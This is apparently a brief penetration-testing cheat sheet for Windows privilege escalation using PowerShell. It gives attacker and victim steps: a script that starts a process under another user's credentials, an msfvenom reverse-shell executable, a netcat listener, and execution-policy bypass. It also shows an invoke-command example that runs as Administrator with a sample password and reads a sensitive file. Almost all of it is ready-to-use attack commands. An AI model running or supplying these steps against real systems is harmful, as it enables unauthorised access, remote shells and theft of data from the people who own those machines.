Switch user on a windows machine with powershell:

	Step 1(attacker): Make a powershell script with following content (Privesc.ps1):
		
		$secpasswd = ConvertTo-SecureString "<password>" -AsPlainText -Force 
		$mycreds = New-Object System.Management.Automation.PSCredential ("<username>", $secpasswd)
		$computer = "<domain>"
		[System.Diagnostics.Process]::Start("C:\Documents and settings\guest\Desktop\Shell.exe","", $mycreds.Username, $mycreds.Password, $computer)

	Step 2 (attacker): generate an msfvenom exe that generates a reverse shell (Shell.exe)
	Step 3 (attacker): nc -lvnp 443
	Step 4 (victim)  : get the files 'Privesc.ps1' and 'Shell.exe' over to the victim box
	Step 5 (victim)  : powershell -ExecutionPolicy Bypass -File C:\Documents and settings\guest\Desktop\Privesc.ps1


Execute a command as another user:

	syntax :	
		$user = '<username>';
		$passwd = '<password>';
		$secpswd = ConvertTo-SecureString $passwd -AsPlainText -Force;
		$credential = New-Object System.Management.Automation.PSCredential $user, $secpswd;
		invoke-command -computername localhost -credential $credential -scriptblock { <command> }

	example: 
		$user = 'Administrator';
		$passwd = 'S3cure4dm1nP@ss';
		$secpswd = ConvertTo-SecureString $passwd -AsPlainText -Force;
		$credential = New-Object System.Management.Automation.PSCredential $user, $secpswd;
		invoke-command -computername localhost -credential $credential -scriptblock { type C:\Users\Administrator\Documents\sensitive.txt }

